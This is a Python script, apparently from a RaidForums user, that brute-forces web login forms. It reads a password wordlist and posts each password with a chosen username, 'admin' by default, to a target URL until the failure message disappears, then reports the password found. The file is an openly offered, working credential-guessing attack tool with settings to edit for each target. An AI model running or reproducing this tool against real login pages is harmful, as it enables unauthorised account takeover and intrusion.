#!/usr/bin/python3

###################################################
#  Made by https://raidforums.com/User-ch0colate  #
###################################################

try:
    import requests
    import json
    import argparse
    import sys
    from bs4 import BeautifulSoup
    from colorama import Fore, Style
except Exception:
    print()
    print(" [!] Error. Libraries not installed.")
    print(" [i] Run: pip install <package name>")
    print(" [i] Required packages: requests, json, argparse, sys, bs4, colorama.")
    print()
    exit(1)
#--------------------------------------------------------------------------------
###################################EDIT THIS###################################
user_parameter = "user"  # Put here the user request parameter
pass_parameter = "pass"  # Put here the password request parameter
submit_parameter1 = "submit"  # Put here the submit request parameter
submit_parameter2 = "Login"  # Put here the submit request parameter
fail_message = "Error"
################################################################################
#--------------------------------------------------------------------------------
# Def the color types
def success_text(text, text2):
    print(" %s%s%s[+] %s >> %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.GREEN, text, text2, Style.RESET_ALL))
def error_text(text):
    print(" %s%s%s[!] %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.RED, text, Style.RESET_ALL))
#--------------------------------------------------------------------------------
# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help="Put here your target (http / https required)", required=True)
parser.add_argument('-u', '--username', default="admin" , help="Put here the username you want to bruteforce (optional)")
# Can edit default="admin" with the user you want to bruteforce
parser.add_argument('-p' ,'--password', help="Put here the wordlist", required=True)
args = parser.parse_args()

# Check for errors
if args.target is not None and "http" not in args.target:
    print()
    error_text("Error. URL must contain http / https.")
    print()
    exit(1)
elif (args.password != None) and (".txt" not in args.password):
    print()
    error_text("Error. Wordlist must be in txt format.")
    print()
    exit(1)
#--------------------------------------------------------------------------------
# Bad password
def invalid(text):
    sys.stdout.flush()
    sys.stdout.write('\r'+' [!] Bad password: ' + text)
#--------------------------------------------------------------------------------
# Send the request
read_pass_file = open(args.password, "r")  # Read the file
for line in read_pass_file:  # Read each line
    password = line.strip()
    http = requests.post(args.target, data={user_parameter:args.username, pass_parameter:password, submit_parameter1:submit_parameter2})  # Thanks Dark Daddy
    # See EDIT THIS at the begining of the file
    content = BeautifulSoup(http.content, "html.parser").get_text()  # Get the content
    if fail_message not in content:
        success_text("Password found!", str(password))
        break
    else:
        invalid(str(password))
exit(1)
